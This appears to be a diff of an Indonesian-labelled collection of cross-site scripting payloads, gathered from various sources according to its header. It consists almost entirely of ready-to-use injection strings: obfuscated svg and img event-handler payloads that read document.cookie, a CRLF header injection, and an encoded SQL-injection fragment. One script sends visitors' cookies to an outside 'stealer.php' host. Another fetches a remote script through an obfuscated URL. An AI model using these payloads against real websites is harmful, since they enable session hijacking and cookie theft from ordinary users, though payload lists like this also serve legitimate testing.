@@ -5,26 +5,47 @@ PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 
 
 <svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
 <!--><svg onload='top[/al/.source+/ert/.source](document.cookie)'>
+
 javascri%0Dpt:alert/**/(1)<svg onload=alert(document.domain)>
+
 abc"><svg+onload=confirm(document.domain)>
+
 abc"><svg+onload=confirm(document.domain)>
+
 <script>alert(1)</script>
+
 <script>alert("xss bug input search by zhirobyte")</script>
+
 "><img src=x onerror=prompt(document.cookie)>
+
 1%27/**/%256fR/**/50%2521%253D22%253B%2523
+
 <svg onload=prompt%26%230000000040document.domain)>
+
 <svg onload=prompt%26%23x000000028;document.domain)>
+
 <script type="text/javascript">
 document.location='https://zhirobyte.000webhostapp.com/stealer.php?c='+document.cookie;</script>
+
 <script type="text/javascript">
+
 <img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))></script>
+
 javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
 “><a href=”#” onmouseleave=alert(test)>Click
+
 <svg%20onload=alert(document.cookie)><"x
+
 1%27/**/%256fR/**/50%2521%253D22%253B%2523 
+
 %0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script><!-- 
 
+%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F
 
 
--------------------------------------------------
+
+-----------------------------------------------------------------------
+ 
